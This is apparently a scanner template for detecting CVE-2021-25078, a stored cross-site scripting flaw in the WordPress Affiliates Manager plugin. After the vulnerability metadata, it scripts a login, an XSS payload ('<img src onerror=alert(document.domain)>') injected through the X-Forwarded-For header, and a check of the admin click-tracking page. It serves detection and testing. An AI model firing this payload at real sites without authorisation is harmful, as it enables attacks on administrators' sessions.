id: CVE-2021-25078
info:
  name: Affiliates Manager < 2.9.0 - Cross Site Scripting
  author: r3Y3r53
  description: 'The plugin does not validate, sanitise and escape the IP address of
    requests logged by the click tracking feature, allowing unauthenticated attackers
    to perform Cross-Site Scripting attacks against admin viewing the tracked requests.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of an authenticated user, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: Fixed in version 2.9.0
  reference:
  - https://wpscan.com/vulnerability/d4edb5f2-aa1b-4e2d-abb4-76c46def6c6e
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25078
  - https://plugins.trac.wordpress.org/changeset/2648196
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-25078
    cwe-id: CWE-79
    epss-score: 0.00382
    epss-percentile: 0.72505
    cpe: cpe:2.3:a:wpaffiliatemanager:affiliates_manager:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: wpaffiliatemanager
    product: affiliates_manager
    framework: wordpress
  tags: cve2021,cve,wp,wordpress,authenticated,affiliates-manager,wp-plugin,xss,wpscan,wpaffiliatemanager
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /?wpam_id=1
    headers:
      X-Forwarded-For: <img src onerror=alert(document.domain)>
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/admin.php?page=wpam-clicktracking
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <img src onerror=alert(document.domain)>Affiliates Manager Click Tracking
